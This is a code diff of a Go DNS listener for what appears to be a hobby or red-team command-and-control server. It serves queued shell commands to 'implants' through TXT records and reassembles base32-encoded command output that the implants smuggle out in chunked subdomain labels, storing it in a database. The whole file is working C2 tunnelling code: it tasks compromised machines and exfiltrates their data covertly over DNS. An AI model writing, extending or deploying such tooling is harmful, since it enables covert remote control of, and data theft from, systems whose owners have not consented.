@@ -3,98 +3,206 @@ package main
 import (
 	"encoding/base32"
 	"flag"
+	"fmt"
 	"github.com/miekg/dns"
 	"gorm.io/gorm"
 	"log"
+	"strconv"
 	"strings"
 	"sync"
 )
 
-// systemd-resolved on VM
+/*
+	TODO: have different endpoints for hiding (not cmd, res) (maybe c, r)? + add /new endpoint, obv
+		- command format: `<implant-id>.cmd.cloud-docker.net`
+		- sending results format: `implantID.taskID.totalChunkCount.chunkIndex.chunkData.res.<domain>`
+*/
 
-// TODO: move to constants area?
+// systemd-resolved on VM
+// TODO: what is it marking tasks as after sending them in HTTPS-listener?
+// TODO: move to constants area? -> how to handle all these flag values
 var domain = flag.String("domain", "cloud-docker.net", "DNS zone")
 
+// TODO:  LOOK THROUGH the cmd + res logic for dns implant + server, make sure everything matches up as its how its sending stuff
 type DNSListener struct {
 	db *gorm.DB
 }
 
-type DNSHandler struct {
-	mu       sync.RWMutex        // thread-safe: guards DNSHandler's internal maps (commands + results) to prevent data race conditions, as ServeDNS can be called concurrently for multiple requests
-	commands map[string][]string // TODO: use TaskQueue instead of []string
-	results  map[string][][]byte // implantID -> slice of result chunks // TODO: does it append results sent in chunks
-	// TODO: add command eventually here so map[string]map[string]string
+// partialResult holds incoming chunks until all are received
+type partialResult struct {
+	totalChunks int
+	chunks      map[int][]byte // chunkIndex -> data
 }
 
-func NewDNSHandler() *DNSHandler {
+type DNSHandler struct {
+	db      *gorm.DB
+	encoder *base32.Encoding // Base32 no-padding encoder
+	decoder *base32.Encoding // Base32 no-padding decoder
+	mu      sync.Mutex
+	pending map[string]map[uint]*partialResult // pending results: implantID -> taskID -> partialResult
+}
+
+func NewDNSHandler(db *gorm.DB) *DNSHandler {
 	return &DNSHandler{
-		commands: map[string][]string{
-			"1": {"touch iwashere1.txt", "touch iwashere2.txt", "echo HI"},
-			"2": {"touch hheheheh1.txt", "touch hheheeheh2.txt"},
-		},
-		results: make(map[string][][]byte),
+		db:      db,
+		encoder: base32.StdEncoding.WithPadding(base32.NoPadding),
+		decoder: base32.StdEncoding.WithPadding(base32.NoPadding),
+		pending: make(map[string]map[uint]*partialResult),
 	}
 }
 
+// getPendingTasks gets all incomplete tasks for the given implant
+func getPendingTasksForImplant(db *gorm.DB, implantID uint) ([]Task, error) {
+	var tasks []Task
+	err := db.
+		Find(&tasks, "implant_id = ? AND completed = ?", implantID, false).
+		Error
+	return tasks, err
+}
+
+// storeNewResult #TODO: write description
+func storeNewResult(db *gorm.DB, implantID uint, res Result) error {
+	return db.Transaction(func(tx *gorm.DB) error {
+		// 1. find the corresponding Task
+		var task Task
+		if err := tx.
+			Where("id = ? AND implant_id = ?", res.TaskID, implantID).
+			First(&task).Error; err != nil {
+			return err
+		}
+
+		if err := tx.Create(&res).Error; err != nil {
+			return err
+		}
+
+		if err := tx.
+			Model(&task).
+			Update("completed", true).
+			Error; err != nil {
+			return err
+		}
+
+		return nil
+	})
+}
+
+// TODO: break into seperate functions? -> to big rn
 func (h *DNSHandler) ServeDNS(w dns.ResponseWriter, req *dns.Msg) {
 	q := req.Question[0]
 	log.Printf("Raw Query %s\n", q.Name)
 	normalizedQName := strings.ToLower(q.Name) // add a comment here
-	log.Printf("Query %s\n", normalizedQName)
 	labels := dns.SplitDomainName(normalizedQName)
 	implantID := labels[0]
-
+	u64ImplantID, err := strconv.ParseUint(implantID, 10, 0)
+	if err != nil {
+		// TODO: std err
+	}
+	// TODO: add some sort of check here that checks for len(labels) to be the minimum length, if not return ?
 	reply := new(dns.Msg)
 	reply.SetReply(req)
 	reply.Authoritative = true
 
-	h.mu.Lock()
-	defer h.mu.Unlock()
-
-	// for _, question := range r.Question { } // TODO: so only support for one question? TODO: write a protocol spec for DNS + HTTPS communications
-	//	qName := question.Name
 	switch q.Qtype {
 	case dns.TypeTXT:
-		/*
-			TODO: combine later into one joint endpoint (ie. beacon?)
-			TODO: have different endpoints for hiding (not cmd, res) (maybe c, r)?
-				TXT for C2 commands/results
-				command format: `<implant-id>.cmd.cloud-docker.net`
-				sending results format: `<implant-id>.<encoded/encrypted-result>.res.cloud-docker.net` // TODO: have result ID here? or just one task at a time
-		*/
-
-		// TODO: check		if len(labels) < 3  { ?
-
-		// domainLabels := strings.Split(questionName, ".")
-
-		// TODO: have "new"/register, where takes in systeminfo, registers implant
 		// TOOD: do the uppercase/lowercase switch differently for the base32 encoding, then ask chat if this is best way to do it
 		if labels[1] == "cmd" { // implant is requesting command
 			// TODO: we should base32encode sent command as well
 
-			if pendingCmds, ok := h.commands[implantID]; ok {
-				if len(pendingCmds) > 0 {
-					cmd := pendingCmds[0]
-					h.commands[implantID] = h.commands[implantID][1:]
-					reply.Answer = []dns.RR{makeTXT(q.Name, cmd)}
-				} else {
-					reply.Answer = []dns.RR{emptyTXT(q.Name)}
+			pendingTasks, err := getPendingTasksForImplant(h.db, uint(u64ImplantID))
+			if err != nil {
+				// TODO: std error
+			}
+
+			pendingCommands := make(map[uint]string, 0) // task ID: task Command
+			for _, task := range pendingTasks {
+				if task.Type != ShellCommand { // throw error? only Command tasks work for DNS
+					continue
+				}
+
+				commandWithArgs, ok := task.Options["commandWithArgs"].([]string)
+				if !ok {
+					continue // TODO: handle error
+				}
+
+				pendingCommands[task.ID] = strings.Join(commandWithArgs, " ")
+			}
+			if len(pendingCommands) == 0 {
+				reply.Answer = []dns.RR{emptyTXT(q.Name)}
+			} else {
+				for taskID, cmd := range pendingCommands {
+					payload := fmt.Sprintf("%d:%s", taskID, cmd)
+					encoded := h.encoder.EncodeToString([]byte(payload))
+					reply.Answer = append(reply.Answer, makeTXT(q.Name, encoded))
 				}
 			}
-		} else if labels[3] == "res" { // implant is sending result of running command
-			// sending results format: `<implant-id>.<chunk-index>.<encoded/encrypted-result-chunk>.res.cloud-docker.net` // TODO: have result ID here? or just one task at a time
-			// labels: [implant_id, chunkData, "res", chunkIndex, domain...]
-			// TODO: fix this so one of the labels is how much total chunkDatas there are?
-			// RN: this implementation only allows for one result for each implant -> make map of cmdTask ids -> results
-			// TODO: handle chunk-id
+		} else if labels[5] == "res" { // implant is sending result of running command
+			// - sending results format: `implantID.taskID.totalChunkCount.chunkIndex.chunkData.res.<domain>`
 
-			chunk := strings.ToUpper(labels[2]) // THIS IS NE
-			// chunk := labels[2]
-			data, err := base32.StdEncoding.DecodeString(chunk)
+			// TODO: need all this?
+			taskID, err1 := strconv.ParseUint(labels[1], 10, 64)
+			totalChunks, err2 := strconv.Atoi(labels[2])
+			chunkIndex, err3 := strconv.Atoi(labels[3])
+
+			if err1 != nil || err2 != nil || err3 != nil {
+				log.Printf("Invalid result labels: %v, %v, %v", err1, err2, err3)
+				reply.Answer = []dns.RR{emptyTXT(q.Name)}
+				break
+			}
+			chunkData := strings.ToUpper(labels[4])
+			data, err := h.decoder.DecodeString(chunkData)
 			if err != nil {
-				log.Printf("Error decoding TXT chunk: %v", err)
+				log.Printf("Error decoding chunk data: %v", err)
+				reply.Answer = []dns.RR{emptyTXT(q.Name)}
+				break
+			}
+			// buffer chunk
+			tID := uint(taskID)
+			if totalChunks == 1 {
+				// TODO: make it so don't repeat this -> could move creating Result to storeNewResult, that would make way more sense
+				newResult := Result{
+					Content: string(data),
+					// TODO: shoudl add Success  -> send as another subdomain field
+					TaskID: tID,
+				}
+				if err := storeNewResult(h.db, uint(u64ImplantID), newResult); err != nil {
+					log.Printf("Error storing single-chunk result: %v", err)
+				}
+				reply.Answer = []dns.RR{emptyTXT(q.Name)}
+				break
+			}
+
+			h.mu.Lock()
+			if _, ok := h.pending[implantID]; !ok {
+				h.pending[implantID] = make(map[uint]*partialResult)
+			}
+			// partialResult
+			pr, exists := h.pending[implantID][tID]
+			if !exists { // TODO: should not
+				pr = &partialResult{totalChunks: totalChunks, chunks: make(map[int][]byte)}
+				h.pending[implantID][tID] = pr
+			}
+			pr.chunks[chunkIndex] = data
+			complete := len(pr.chunks) == pr.totalChunks
+			if complete {
+				// assmeble
+				assembled := make([]byte, 0)
+				for i := 1; i <= pr.totalChunks; i++ {
+					assembled = append(assembled, pr.chunks[i]...)
+				}
+				// cleanup buffer
+				delete(h.pending[implantID], tID)
+				h.mu.Unlock()
+				// store in DB
+				newResult := Result{
+					Content: string(assembled),
+					// TODO: shoudl add Success  -> send as another subdomain field
+					TaskID: tID,
+				}
+				if err := storeNewResult(h.db, uint(u64ImplantID), newResult); err != nil {
+					log.Printf("Error storing full result: %v", err)
+				}
 			} else {
-				h.results[implantID] = append(h.results[implantID], data)
+				h.mu.Unlock()
 			}
 			reply.Answer = []dns.RR{emptyTXT(q.Name)}
 		} else {
@@ -103,6 +211,8 @@ func (h *DNSHandler) ServeDNS(w dns.ResponseWriter, req *dns.Msg) {
 	case dns.TypeSOA:
 	// TODO - look at one in c2 server
 	case dns.TypeNS: // TODO
+	default:
+		reply.Answer = []dns.RR{emptyTXT(q.Name)} // TODO: would this wokr?
 	}
 
 	if err := w.WriteMsg(reply); err != nil {
@@ -114,7 +224,7 @@ func (listener *DNSListener) listen() {
 	server := &dns.Server{
 		Addr:    ":53",
 		Net:     "udp",
-		Handler: NewDNSHandler()}
+		Handler: NewDNSHandler(listener.db)}
 	log.Printf("Starting DNS server for zone %s on port 53", *domain)
 	if err := server.ListenAndServe(); err != nil {
 		log.Fatalf("server failed: %v", err)
@@ -124,7 +234,7 @@ func (listener *DNSListener) listen() {
 // helper for empty TXT
 func emptyTXT(name string) dns.RR {
 	return &dns.TXT{
-		Hdr: dns.RR_Header{Name: dns.Fqdn(name), Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
+		Hdr: dns.RR_Header{Name: dns.Fqdn(name), Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 5},
 		Txt: []string{""},
 	}
 }
@@ -132,7 +242,7 @@ func emptyTXT(name string) dns.RR {
 // helper to create TXT with data
 func makeTXT(name, txt string) dns.RR {
 	return &dns.TXT{
-		Hdr: dns.RR_Header{Name: dns.Fqdn(name), Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
+		Hdr: dns.RR_Header{Name: dns.Fqdn(name), Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 5},
 		Txt: []string{txt},
 	}
 }
